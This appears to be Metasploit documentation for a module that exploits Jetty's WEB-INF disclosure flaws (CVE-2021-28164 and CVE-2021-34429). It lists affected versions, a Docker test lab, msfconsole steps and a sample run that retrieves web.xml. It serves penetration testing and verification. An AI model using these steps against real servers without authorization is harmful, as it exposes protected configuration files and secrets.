## Vulnerable Application

Jetty suffers from a vulnerability where certain encoded URIs and ambiguous paths can access
protected files in the `WEB-INF` folder.

The affected versions depend on the selected `CVE` option:

| CVE | Affected releases | First fixed releases |
| --- | --- | --- |
| [CVE-2021-28164][cve-28164] | 9.4.37.v20210219, 9.4.38.v20210224 | 9.4.39 |
| [CVE-2021-34429][cve-34429] | 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5 | 9.4.43, 10.0.6, 11.0.6 |

[cve-28164]: https://github.com/jetty/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
[cve-34429]: https://github.com/jetty/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm

The check compares the advertised release with the selected CVE's range. An
affected version returns `Appears`; it does not prove that a protected file can
be read under the server's current URI compliance configuration. Fixed releases
are excluded, including Jetty 9.x headers with a `.vYYYYMMDD` build suffix.
Recognizable Jetty banners with malformed or unsupported version formats return
`Unknown` because their affected release range cannot be determined.

Exploitation can obtain any file in the `WEB-INF` folder, but web.xml is most likely
to have information of value.

### CVE-2021-34429

Use the Docker image from [ColdFusionX](https://github.com/ColdFusionX/CVE-2021-34429) at
https://github.com/ColdFusionX/CVE-2021-34429/blob/main/docker-compose.yml

## Automated Container Lab

The repository includes [bounded Jetty file-read tests](../../../../test/module_targets/jetty_webinf/README.md)
for both CVE selections on vulnerable and fixed 9.x, 10.x and 11.x releases, plus
an unrelated Apache control. They compare real protected files and HTTP behavior
with exact module loot; profile registration alone does not establish a pass.
Existing human Scenarios below are preserved.

## Verification Steps

1. Install Jetty with an app that contains a `WEB-INF` folder
1. Start msfconsole
1. Do: `use auxiliary/gather/jetty_web_inf_disclosure`
1. Do: `set rhosts`
1. Do: `run`
1. You should get the contents of a file

## Options

### FILE

The file in the `WEB-INF` folder to retrieve. Defaults to `web.xml`

### CVE

Which vulnerability to check and use. Options: `CVE-2021-34429`, `CVE-2021-28164`.
Defaults to `CVE-2021-34429`. AutoCheck refuses execution when the advertised
version is outside the selected CVE's affected range.

## Scenarios

### Jetty 11.0.5 from Docker

```
resource (jetty.rb)> use auxiliary/gather/jetty_web_inf_disclosure
resource (jetty.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (jetty.rb)> set rport 8080
rport => 8080
resource (jetty.rb)> set verbose true
verbose => true
resource (jetty.rb)> run
[*] Running module against 1.1.1.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Found version: 11.0.5
[+] 11.0.5 vulnerable to CVE-2021-34429
[!] The service is running, but could not be validated.
[+] File stored to /home/h00die/.msf4/loot/20211108134054_default_1.1.1.1_jetty.web.xml_813220.xml
[+] <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >
<web-app>
<display-name>ColdFusionX - Web Application</display-name>
</web-app>
```
